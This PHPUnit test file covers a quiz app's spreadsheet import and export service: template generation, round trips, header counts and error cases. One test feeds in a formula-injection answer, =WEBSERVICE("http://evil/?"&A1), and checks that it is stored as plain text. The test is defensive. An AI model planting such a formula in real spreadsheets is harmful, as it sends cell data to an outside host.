<?php

declare(strict_types=1);

namespace Tvdt\Tests\Unit\Service;

use PhpOffice\PhpSpreadsheet\Cell\DataType;
use PhpOffice\PhpSpreadsheet\Reader;
use PhpOffice\PhpSpreadsheet\Spreadsheet;
use PhpOffice\PhpSpreadsheet\Writer;
use PHPUnit\Framework\Attributes\CoversClass;
use PHPUnit\Framework\Attributes\DataProvider;
use PHPUnit\Framework\TestCase;
use Symfony\Component\HttpFoundation\File\File;
use Tvdt\Entity\Answer;
use Tvdt\Entity\Question;
use Tvdt\Entity\Quiz;
use Tvdt\Exception\SpreadsheetDataException;
use Tvdt\Service\QuizSpreadsheetService;

use function Safe\file_put_contents;
use function Safe\ob_get_clean;
use function Safe\ob_start;
use function Safe\unlink;

#[CoversClass(QuizSpreadsheetService::class)]
final class QuizSpreadsheetServiceTest extends TestCase
{
    private QuizSpreadsheetService $subject;

    /** @var list<string> */
    private array $tempFiles = [];

    protected function setUp(): void
    {
        $this->subject = new QuizSpreadsheetService();
    }

    protected function tearDown(): void
    {
        foreach ($this->tempFiles as $path) {
            if (file_exists($path)) {
                unlink($path);
            }
        }
    }

    public function testGenerateTemplateProducesValidXlsx(): void
    {
        $path = $this->captureXlsx($this->subject->generateTemplate());

        $this->assertSame(
            'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet',
            new File($path)->getMimeType(),
        );
    }

    public function testGenerateTemplateWithoutExampleHasNoQuestions(): void
    {
        $path = $this->captureXlsx($this->subject->generateTemplate(fillExample: false));

        $quiz = new Quiz();
        $this->subject->xlsxToQuiz($quiz, new File($path));

        $this->assertCount(0, $quiz->questions);
    }

    public function testGenerateTemplateExampleCanBeReimported(): void
    {
        $path = $this->captureXlsx($this->subject->generateTemplate(fillExample: true));

        $quiz = new Quiz();
        $this->subject->xlsxToQuiz($quiz, new File($path));

        $this->assertCount(2, $quiz->questions);

        /** @var Question $first */
        $first = $quiz->questions->first();
        $this->assertSame('Is de mol een man of een vrouw?', $first->question);
        $this->assertCount(2, $first->answers);

        /** @var Question $second */
        $second = $quiz->questions->last();
        $this->assertSame('Wie is de mol?', $second->question);
        $this->assertCount(10, $second->answers);
    }

    public function testQuizToXlsxEmptyQuizImportsWithNoQuestions(): void
    {
        $path = $this->captureXlsx($this->subject->quizToXlsx(new Quiz()));

        $imported = new Quiz();
        $this->subject->xlsxToQuiz($imported, new File($path));

        $this->assertCount(0, $imported->questions);
    }

    public function testQuizToXlsxRoundTrip(): void
    {
        $original = $this->makeQuiz();
        $path = $this->captureXlsx($this->subject->quizToXlsx($original));

        $imported = new Quiz();
        $this->subject->xlsxToQuiz($imported, new File($path));

        $this->assertCount(2, $imported->questions);

        /** @var Question $first */
        $first = $imported->questions->first();
        $this->assertSame('Who is de Mol?', $first->question);
        $this->assertCount(2, $first->answers);

        $answers = $first->answers->toArray();
        $this->assertSame('Alice', $answers[0]->text);
        $this->assertFalse($answers[0]->isRightAnswer);
        $this->assertSame('Bob', $answers[1]->text);
        $this->assertTrue($answers[1]->isRightAnswer);

        /** @var Question $second */
        $second = $imported->questions->last();
        $this->assertSame('What did de Mol sabotage?', $second->question);
        $this->assertCount(3, $second->answers);
    }

    public function testQuizToXlsxStoresFormulaLikeAnswerTextAsPlainString(): void
    {
        $quiz = new Quiz();
        $question = new Question();
        $question->question = 'Who missed the assignment?';
        $question->ordering = 1;
        $question->addAnswer(new Answer('=WEBSERVICE("http://evil/?"&A1)', isRightAnswer: true));
        $question->addAnswer(new Answer('Bob', isRightAnswer: false));

        $quiz->addQuestion($question);

        $path = $this->captureXlsx($this->subject->quizToXlsx($quiz));

        $sheet = new Reader\Xlsx()->setReadDataOnly(true)->load($path)->getActiveSheet();
        $cell = $sheet->getCell('B2');

        $this->assertSame(DataType::TYPE_STRING, $cell->getDataType());
        $this->assertSame('=WEBSERVICE("http://evil/?"&A1)', $cell->getValue());
    }

    public function testXlsxToQuizThrowsOnInvalidMimeType(): void
    {
        $path = $this->createTempPath('.txt');
        file_put_contents($path, 'not a spreadsheet');

        $this->expectException(\InvalidArgumentException::class);
        $this->subject->xlsxToQuiz(new Quiz(), new File($path));
    }

    public function testXlsxToQuizThrowsOnQuestionWithNoAnswers(): void
    {
        $quiz = new Quiz();
        $question = new Question();
        $question->question = 'Unanswered question';
        $question->ordering = 1;

        $quiz->addQuestion($question);

        $path = $this->captureXlsx($this->subject->quizToXlsx($quiz));

        try {
            $this->subject->xlsxToQuiz(new Quiz(), new File($path));
            $this->fail('Expected SpreadsheetDataException to be thrown');
        } catch (SpreadsheetDataException $spreadsheetDataException) {
            $this->assertNotEmpty($spreadsheetDataException->errors);
        }
    }

    public function testXlsxToQuizStopsAtBlankRow(): void
    {
        $spreadsheet = new Spreadsheet();
        $sheet = $spreadsheet->getActiveSheet();
        $sheet->setCellValue('A1', 'Question');
        $sheet->setCellValue('B1', 'Answer 1');
        $sheet->setCellValue('C1', 'Correct');
        $sheet->setCellValue('A2', 'First question');
        $sheet->setCellValue('B2', 'Yes');
        $sheet->setCellValue('C2', true);
        // Row 3 intentionally blank — should halt parsing
        $sheet->setCellValue('A4', 'Second question');
        $sheet->setCellValue('B4', 'No');
        $sheet->setCellValue('C4', false);

        $path = $this->createTempPath('.xlsx');
        ob_start();
        new Writer\Xlsx($spreadsheet)->save('php://output');
        file_put_contents($path, ob_get_clean());

        $quiz = new Quiz();
        $this->subject->xlsxToQuiz($quiz, new File($path));

        $this->assertCount(1, $quiz->questions);
        /** @var Question $first */
        $first = $quiz->questions->first();
        $this->assertSame('First question', $first->question);
    }

    /** @return \Iterator<string, array{int, string, int, string, int, int}> */
    public static function answerCountHeaderProvider(): \Iterator
    {
        // Columns (0-based): Question=0, Answer1=1, Correct=2, Answer2=3, Correct=4, …
        // Answer N is at index 1+2*(N-1) = 2N-1, Correct N at 2+2*(N-1) = 2N.
        yield '2 answers → 2 header pairs' => [2,  'Answer 2',  3,  'Correct', 4,  5];
        yield '6 answers → 6 header pairs' => [6,  'Answer 6',  11, 'Correct', 12, 13];
        yield '7 answers → 7 header pairs' => [7,  'Answer 7',  13, 'Correct', 14, 15];
        yield '10 answers → 10 header pairs' => [10, 'Answer 10', 19, 'Correct', 20, 21];
    }

    #[DataProvider('answerCountHeaderProvider')]
    public function testQuizToXlsxHeaderCountMatchesAnswerCount(
        int $answerCount,
        string $lastAnswerHeader,
        int $lastAnswerIndex,
        string $lastCorrectHeader,
        int $lastCorrectIndex,
        int $absentIndex,
    ): void {
        $path = $this->captureXlsx($this->subject->quizToXlsx($this->makeQuizWithAnswerCounts($answerCount)));
        $headers = $this->readFirstRow($path);

        $this->assertSame($lastAnswerHeader, $headers[$lastAnswerIndex]);
        $this->assertSame($lastCorrectHeader, $headers[$lastCorrectIndex]);
        $this->assertArrayNotHasKey($absentIndex, $headers);
    }

    public function testQuizToXlsxHeadersMatchMaxAnswersAcrossQuestions(): void
    {
        $quiz = new Quiz();
        $quiz->addQuestion($this->makeQuestion('Short', 3));
        $quiz->addQuestion($this->makeQuestion('Long', 7));
        $quiz->addQuestion($this->makeQuestion('Medium', 5));

        $path = $this->captureXlsx($this->subject->quizToXlsx($quiz));
        $headers = $this->readFirstRow($path);

        $this->assertSame('Answer 7', $headers[13]);
        $this->assertSame('Correct', $headers[14]);
        $this->assertArrayNotHasKey(15, $headers);
    }

    public function testQuizToXlsxRoundTripWithSevenAnswers(): void
    {
        $original = $this->makeQuizWithAnswerCounts(7);
        $path = $this->captureXlsx($this->subject->quizToXlsx($original));

        $imported = new Quiz();
        $this->subject->xlsxToQuiz($imported, new File($path));

        $this->assertCount(1, $imported->questions);
        /** @var Question $question */
        $question = $imported->questions->first();
        $this->assertCount(7, $question->answers);
    }

    private function makeQuiz(): Quiz
    {
        $quiz = new Quiz();

        $q1 = new Question();
        $q1->question = 'Who is de Mol?';
        $q1->ordering = 1;
        $q1->addAnswer(new Answer('Alice', isRightAnswer: false));
        $q1->addAnswer(new Answer('Bob', isRightAnswer: true));

        $q2 = new Question();
        $q2->question = 'What did de Mol sabotage?';
        $q2->ordering = 2;
        $q2->addAnswer(new Answer('The boat', isRightAnswer: true));
        $q2->addAnswer(new Answer('The car', isRightAnswer: false));
        $q2->addAnswer(new Answer('Nothing', isRightAnswer: false));

        $quiz->addQuestion($q1);
        $quiz->addQuestion($q2);

        return $quiz;
    }

    private function makeQuizWithAnswerCounts(int ...$counts): Quiz
    {
        $quiz = new Quiz();
        foreach ($counts as $i => $count) {
            $quiz->addQuestion($this->makeQuestion('Question '.$i, $count));
        }

        return $quiz;
    }

    private function makeQuestion(string $text, int $answerCount): Question
    {
        $question = new Question();
        $question->question = $text;
        $question->ordering = 1;
        for ($i = 1; $i <= $answerCount; ++$i) {
            $question->addAnswer(new Answer('Answer '.$i, isRightAnswer: false));
        }

        return $question;
    }

    /** @return array<int, string|null> */
    private function readFirstRow(string $path): array
    {
        $rows = new Reader\Xlsx()->setReadDataOnly(true)->load($path)->getActiveSheet()->toArray(formatData: false);

        return $rows[0] ?? [];
    }

    private function captureXlsx(\Closure $closure): string
    {
        $path = $this->createTempPath('.xlsx');
        ob_start();
        $closure();
        file_put_contents($path, ob_get_clean());

        return $path;
    }

    private function createTempPath(string $suffix): string
    {
        $path = sys_get_temp_dir().\DIRECTORY_SEPARATOR.uniqid('tvdt_test_', more_entropy: true).$suffix;
        $this->tempFiles[] = $path;

        return $path;
    }
}
